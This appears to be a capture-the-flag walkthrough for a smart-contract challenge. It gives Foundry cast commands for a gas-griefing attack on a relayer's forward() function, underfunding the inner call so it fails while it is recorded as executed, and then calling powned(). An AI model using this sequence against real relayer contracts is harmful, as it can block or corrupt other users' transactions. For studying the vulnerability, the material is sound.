**Exploit**
---

**Get your deployed Target address**

```
TARGET=$(cast call $PROXY "current_contract(address)(address)" $PUBLIC_KEY --rpc-url $RPC)
echo "Target: $TARGET"
```
**Get the Relayer address from Target**
```
RELAYER=$(cast call $TARGET "relayer()(address)" --rpc-url $RPC)
echo "Relayer: $RELAYER"
```
**Get gas estimate for execute()**
```
cast estimate $RELAYER "forward(address,uint256)" $PUBLIC_KEY 999999 --from $PUBLIC_KEY --rpc-url $RPC
```
**Send gas griefing attack (60000 is the amount of gas)**
```
cast send $RELAYER "forward(address,uint256)" $PUBLIC_KEY 60000 --private-key $PRIVATE_KEY --rpc-url $RPC
```
**Check**
```
cast call $RELAYER "wasExecuted(address)(bool)" $PUBLIC_KEY --rpc-url $RPC
```
\# want: true
```
cast call $TARGET "enoughGas(address)(bool)" $PUBLIC_KEY --rpc-url $RPC
```
\# want: true
```
cast call $TARGET "executed(address)(bool)" $PUBLIC_KEY --rpc-url $RPC
```
\# want: false

**Call powned()**
```
cast send $TARGET "powned()" --private-key $PRIVATE_KEY --rpc-url $RPC
```
**Call reset if missed target states**
```
cast send $RELAYER "reset(address)" $PUBLIC_KEY --private-key $PRIVATE_KEY --rpc-url $RPC
```